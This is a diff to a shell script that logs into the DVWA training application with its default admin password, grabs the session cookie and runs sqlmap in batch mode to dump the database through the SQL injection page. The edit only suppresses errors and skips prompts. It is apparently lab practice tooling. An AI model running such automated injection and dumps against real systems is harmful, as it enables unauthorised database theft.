@@ -11,8 +11,8 @@ display_usage() {
 
 host="http://$1"
 port=$2
-rm dvwa.cookie
-rm /root/.sqlmap/output/dvwa.com/* -r
+rm dvwa.cookie 2>/dev/null
+rm /root/.sqlmap/output/dvwa.com/* -r 2>/dev/null
 if [ "$port" -ne "80" ] 
 	then
 	  host="$host:$port"	
@@ -23,4 +23,4 @@ SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F '\t' '{print $7}')
 curl -s -b dvwa.cookie -d "username=admin&password=password&user_token=${CSRF}&Login=Login" "$host/login.php"
 SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F '\t' '{print $7}')
 cookie="PHPSESSID=${SESSIONID}"
-sqlmap --random-agent --flush-session -u "$host/vulnerabilities/sqli/?id=1&Submit=Submit#&#8221" --cookie="$cookie; security=low" --dump
+sqlmap --random-agent --batch --flush-session -u "$host/vulnerabilities/sqli/?id=1&Submit=Submit#&#8221" --cookie="$cookie; security=low" --dump
